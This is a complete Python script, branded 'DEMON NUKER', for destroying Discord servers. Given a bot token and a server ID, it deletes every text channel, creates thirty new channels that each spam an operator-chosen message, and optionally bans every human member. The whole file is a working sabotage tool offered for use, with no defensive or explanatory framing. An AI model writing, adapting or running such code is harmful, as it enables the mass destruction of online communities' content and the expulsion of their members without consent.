import discord
from discord.ext import commands
import asyncio
import os
import pyfiglet
from colorama import Fore, Style, init

init(autoreset=True) 
os.system('cls' if os.name == 'nt' else 'clear')

text = "DEMON NUKER"
ascii_art = pyfiglet.figlet_format(text)

print(Fore.GREEN + ascii_art)

token = input(Fore.GREEN + "type token bot discord: ")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

message = input(Fore.GREEN + "message: ")
room_name = input(Fore.GREEN + "name room: ")
ban_all = input(Fore.GREEN + "ban all? (y-n): ").strip().lower()
server_id = int(input(Fore.GREEN + "id server: "))

@bot.event
async def on_ready():
    print(Fore.GREEN + f'Logged in as {bot.user}')

    guild = bot.get_guild(server_id)
    if not guild:
        print(Fore.GREEN + "Server not found!")
        return

    delete_tasks = []
    for channel in guild.text_channels:
        delete_tasks.append(channel.delete())
    await asyncio.gather(*delete_tasks)
    print(Fore.GREEN + "All channels deleted!")

    create_tasks = []
    for _ in range(30):
        create_tasks.append(guild.create_text_channel(room_name))
    new_channels = await asyncio.gather(*create_tasks)
    send_tasks = []
    for new_channel in new_channels:
        send_tasks.append(new_channel.send(message))
    await asyncio.gather(*send_tasks)
    print(Fore.GREEN + "All channels created and message sent!")

    if ban_all == 'y':
        ban_tasks = []
        for member in guild.members:
            if not member.bot:
                ban_tasks.append(member.ban(reason="Banned by bot"))
        await asyncio.gather(*ban_tasks)
        print(Fore.GREEN + "All members banned!")
    else:
        print(Fore.GREEN + "No members were banned.")

    print(Fore.GREEN + "Done!")

bot.run(token)
